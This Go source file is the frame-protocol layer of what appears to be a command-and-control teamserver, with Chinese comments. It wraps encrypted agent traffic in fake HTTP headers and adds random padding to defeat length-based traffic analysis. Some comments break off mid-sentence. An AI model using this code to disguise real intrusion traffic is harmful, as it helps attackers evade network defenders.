// Package protocol 帧协议层: [4B 长度][载荷] + 可选 HTTP 伪装壳 + 帧填充 + 传输加密。
// 照搬自旧 Server frame.go, 将 transportCrypto(全局) 与 mimicEnabled(全局) 解耦为
// Conn 结构体字段, 便于多 listener/配置。
package protocol

import (
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"math/rand"
	"net"
	"time"

	"cleat/teamserver/internal/crypto"
	"cleat/teamserver/internal/logx"
)

const (
	// MaxBodySize 单帧最大载荷(与 Agent/旧 Server 一致)。
	MaxBodySize = 50 * 1024 * 1024
	// WriteTimeout 单次写帧超时:避免 socket 缓冲满时永久阻塞。
	WriteTimeout = 60 * time.Second
	// ReadTimeout 单次读帧超时: 读长度头/载荷前必须设
	// ReadDeadline —— 否则攻击者只发长度头然后挂起, 每连接占 50MB 预算并常驻
	// goroutine(内存 DoS)。取值依据: TCP 通道 Agent 心跳 ~30s, 120s = 4 拍余量,
	// 正常空闲会话不会误杀; 挂起连接 120s 后必然断开释放资源。
	ReadTimeout = 120 * time.Second
	// maxFramePadding 帧填充上限(字节): 每帧在密文后追加 [0, maxFramePadding)
	// 随机填充 + 2B 填充长度(小端)。必须与 Agent TrafficShaper 的 kMaxPad 一致。
	maxFramePadding = 512
)

// Conn 是带帧协议 + 伪装的连接包装。
type Conn struct {
	net.Conn
	cbox      *crypto.Box       // 非 nil 时启 PSK 传输加密
	xbox      *crypto.X25519Box // 非 nil 时 X25519 会话模式(优先于 cbox)
	lastKeyID uint64            // 最近一帧的 key_id(X25519 响应同 key_id 回)
	mimic     bool              // 帧前包 HTTP 伪装头
	padding   bool              // 帧尾随机填充(与伪装壳解耦; mimic=true 恒含填充,
	                            // WS 通道 = mimic=false + padding=true, 无壳有填充)
}

// NewConn 包装一个已建立的 TCP 连接。
func NewConn(c net.Conn, cbox *crypto.Box, xbox *crypto.X25519Box, mimic bool) *Conn {
	return &Conn{Conn: c, cbox: cbox, xbox: xbox, mimic: mimic, padding: mimic}
}

// NewWsConn 包装一条已升级的 WebSocket 通道连接(桥接为 net.Conn 后传入)。
// 无 HTTP 伪装壳(WS 升级握手本身即壳), 但保留帧填充 —— TLS 不藏长度, 填充使
func NewWsConn(c net.Conn, cbox *crypto.Box, xbox *crypto.X25519Box) *Conn {
	return &Conn{Conn: c, cbox: cbox, xbox: xbox, mimic: false, padding: true}
}

// NewQuicConn 包装一条已建立的 QUIC 双向 stream(桥接为 net.Conn 后传入)。
// 与 NewWsConn 同参: 无 HTTP 伪装壳(QUIC 自身 TLS/UDP 形态即壳), 保留帧填充
func NewQuicConn(c net.Conn, cbox *crypto.Box, xbox *crypto.X25519Box) *Conn {
	return &Conn{Conn: c, cbox: cbox, xbox: xbox, mimic: false, padding: true}
}

// skipMimicHeader 消费连接上的 HTTP 伪装头(到 \r\n\r\n 为止)。
// 逐字节读取: 不多读一字节(后续帧数据必须原样保留)。头上限 8KB 防恶意。
func skipMimicHeader(conn net.Conn) error {
	buf := make([]byte, 1)
	match := 0 // 已匹配的 \r\n\r\n 前缀长度
	for i := 0; i < 8*1024; i++ {
		if _, err := io.ReadFull(conn, buf); err != nil {
			return err
		}
		switch match {
		case 0:
			if buf[0] == '\r' {
				match = 1
			}
		case 1:
			if buf[0] == '\n' {
				match = 2
			} else if buf[0] != '\r' {
				match = 0
			}
		case 2:
			if buf[0] == '\r' {
				match = 3
			} else {
				match = 0
			}
		case 3:
			if buf[0] == '\n' {
				return nil
			} else if buf[0] == '\r' {
				match = 1
			} else {
				match = 0
			}
		}
	}
	return errors.New("mimic header too long")
}

// addFramePadding 帧尾追加随机填充: [载荷][随机填充][2B填充长度(小端)]。
// 与 Agent TrafficShaper 对称, 使线上帧长不等于真实载荷长。
func addFramePadding(frame []byte) []byte {
	padLen := rand.Intn(maxFramePadding)
	out := make([]byte, 0, len(frame)+padLen+2)
	out = append(out, frame...)
	pad := make([]byte, padLen)
	_, _ = rand.Read(pad)
	out = append(out, pad...)
	out = append(out, byte(padLen), byte(padLen>>8))
	return out
}

// stripFramePadding 剥离帧尾填充, 返回真实载荷。
func stripFramePadding(frame []byte) ([]byte, error) {
	if len(frame) < 2 {
		return nil, errors.New("frame too short for padding")
	}
	n := len(frame)
	padLen := int(frame[n-2]) | int(frame[n-1])<<8
	if padLen+2 > n {
		return nil, errors.New("invalid frame padding")
	}
	return frame[:n-padLen-2], nil
}

// ReadFrame 读取一帧并解密 + 剥填充, 返回原始载荷。
// X25519 模式: 先消费明文握手帧("KE"...), 再按 key_id 路由解密。
func (c *Conn) ReadFrame() ([]byte, error) {
	for {
		body, err := c.readRawBody()
		if err != nil {
			return nil, err
		}
		// X25519 握手帧(明文, 非业务): 消费后继续读下一帧
		if c.xbox != nil && len(body) >= 2 && body[0] == 'K' && body[1] == 'E' {
			if c.xbox.Handshake(body) {
				// logx 的级别控制与文件 sink, 且打印完整 key_id(会话路由标识,
				// 无排障必要却构成不必要的信息暴露)。改走 logx 诊断通道并收敛
				// 输出内容。
				logx.Printf("[KE] 握手帧已消费 len=%d", len(body))
				continue
			}
			// 格式异常是值得关注的协商异常: 走操作员通知通道, 不静默吞掉。
			logx.Notifyf("[KE] 握手帧未消费(格式异常), 已忽略并继续读数")
		}
		if c.xbox != nil {
			if len(body) < 8 {
				return nil, errors.New("frame too short for key_id")
			}
			c.lastKeyID = binary.BigEndian.Uint64(body[:8])
			dec, err := c.xbox.DecryptFrame(body)
			if err != nil {
				return nil, err
			}
			return dec, nil
		}
		if c.cbox != nil {
			dec, err := c.cbox.Decrypt(body)
			if err != nil {
				return nil, err
			}
			body = dec
		}
		return body, nil
	}
}

// readRawBody 读取一帧原始载荷(剥伪装头 + 长度头 + 帧填充, 未解密)。
// 长度校验前置(先验长度再分配) + 读取全程设 ReadDeadline:
// deadline 覆盖 mimic 头/长度头/载荷全部读取步骤 —— 任一步挂起都在 ReadTimeout
// 内返回超时错误, 不给"只发几个字节然后挂住"的连接常驻内存与 goroutine 的机会。
// 超时错误 ≠ 断连: 调用方(runLoop)对 Timeout 类错误继续读(空闲会话不受影响)。
func (c *Conn) readRawBody() ([]byte, error) {
	if err := c.Conn.SetReadDeadline(time.Now().Add(ReadTimeout)); err != nil {
		return nil, err
	}
	if c.mimic {
		if err := skipMimicHeader(c.Conn); err != nil {
			return nil, err
		}
	}
	lenBuf := make([]byte, 4)
	if _, err := io.ReadFull(c.Conn, lenBuf); err != nil {
		return nil, err
	}
	length := binary.BigEndian.Uint32(lenBuf)
	if length > MaxBodySize {
		return nil, errors.New("frame too large")
	}
	// 校验通过才按长度分配; deadline 重置覆盖载荷读取全程
	if err := c.Conn.SetReadDeadline(time.Now().Add(ReadTimeout)); err != nil {
		return nil, err
	}
	body := make([]byte, length)
	if _, err := io.ReadFull(c.Conn, body); err != nil {
		return nil, err
	}
	// 帧读毕清除 deadline, 不影响后续空闲等待(下一帧读入时再设)
	_ = c.Conn.SetReadDeadline(time.Time{})
	if c.padding {
		dec, err := stripFramePadding(body)
		if err != nil {
			return nil, err
		}
		body = dec
	}
	return body, nil
}

// WriteFrame 发送一帧(先加密 + 填充 + 伪装头 + 长度 + 载荷)。
// X25519 模式: 用最近一帧的 key_id 加密(响应必须同 key_id)。
func (c *Conn) WriteFrame(data []byte) error {
	if err := c.Conn.SetWriteDeadline(time.Now().Add(WriteTimeout)); err != nil {
		return err
	}
	if c.xbox != nil {
		// 若本连接尚未读到任何业务帧(先写后读), 此处会带着 key_id=0 进入
		// EncryptForKeyID 并返回"未知 key_id 0" —— 错误文案掩盖了真实原因
		// (调用序错误), 排障困难。此处显式区分: key_id=0 即无有效会话密钥。
		if c.lastKeyID == 0 {
			return errors.New("WriteFrame: 尚无有效会话 key_id(需先读入一帧以确立 key_id, 不能先写后读)")
		}
		enc, err := c.xbox.EncryptForKeyID(c.lastKeyID, data)
		if err != nil {
			return err
		}
		data = enc
	} else if c.cbox != nil {
		enc, err := c.cbox.Encrypt(data)
		if err != nil {
			return err
		}
		data = enc
	}
	// 整帧拼成一个 buffer 后单次 Write。
	// 原实现按 header / lenBuf / data 分 2~3 次裸 Write: 每帧多 1~2 次 syscall,
	// 且 header 与 lenBuf 恒先于 data 独立成段发出 —— 在弱网/高丢包链路上放大往返次数
	// (即便 TCP_NODELAY 生效, 小段仍各占一个 TCP 段)。
	// padding 与 mimic 已解耦(WS 通道 = 无壳有填充): 填充先于壳应用。
	var buf []byte
	if c.padding {
		data = addFramePadding(data)
	}
	if c.mimic {
		header := fmt.Sprintf("HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: %d\r\n\r\n",
			len(data))
		buf = make([]byte, 0, len(header)+4+len(data))
		buf = append(buf, header...)
	} else {
		buf = make([]byte, 0, 4+len(data))
	}
	var lenBuf [4]byte
	binary.BigEndian.PutUint32(lenBuf[:], uint32(len(data)))
	buf = append(buf, lenBuf[:]...)
	buf = append(buf, data...)

	_, err := c.Conn.Write(buf)
	return err
}

// Close 关闭底层连接。
func (c *Conn) Close() { c.Conn.Close() }
